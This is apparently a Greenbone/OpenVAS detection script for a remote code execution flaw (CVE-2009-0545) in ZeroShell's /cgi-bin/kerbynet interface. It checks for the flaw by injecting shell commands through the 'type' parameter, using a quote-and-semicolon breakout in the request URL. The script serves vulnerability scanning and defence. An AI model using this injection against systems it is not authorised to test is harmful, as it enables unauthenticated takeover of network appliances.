if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108945" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2020-10-19 08:08:37 +0000 (Mon, 19 Oct 2020)" );
	script_cve_id( "CVE-2009-0545" );
	script_bugtraq_id( 33702 );
	script_name( "ZeroShell <= 1.0beta11 RCE Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 443 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "https://ikkisoft.com/stuff/LC-2009-01.txt" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/33702" );
	script_tag( name: "summary", value: "ZeroShell is prone to a remote code execution (RCE) vulnerability
  because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view files or execute
  arbitrary script code in the context of the web server process. This may aid in further attacks." );
	script_tag( name: "vuldetect", value: "Send a GET request, try to include a local file and check the response." );
	script_tag( name: "insight", value: "Input to the 'type' value in /cgi-bin/kerbynet is not properly sanitized." );
	script_tag( name: "solution", value: "Update to version 1.0beta12 or later." );
	script_tag( name: "affected", value: "ZeroShell versions 1.0beta11 and below." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 443 );
buf = http_get_cache( item: "/", port: port );
if(!buf || ( !ContainsString( buf, "<title>ZeroShell" ) && !ContainsString( buf, "/cgi-bin/kerbynet" ) )){
	exit( 0 );
}
cmds = exploit_commands( "linux" );
for pattern in keys( cmds ) {
	cmd = cmds[pattern];
	url = "/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;" + cmd + ";%22";
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(match = egrep( string: buf, pattern: pattern )){
		info["1. URL"] = http_report_vuln_url( port: port, url: url, url_only: TRUE );
		info["2. Used command"] = cmd;
		info["3. Expected result"] = pattern;
		report = "By doing the following request:\n\n";
		report += text_format_table( array: info ) + "\n\n";
		report += "it was possible to execute a command on the target.";
		report += "\n\nResult: " + chomp( match );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

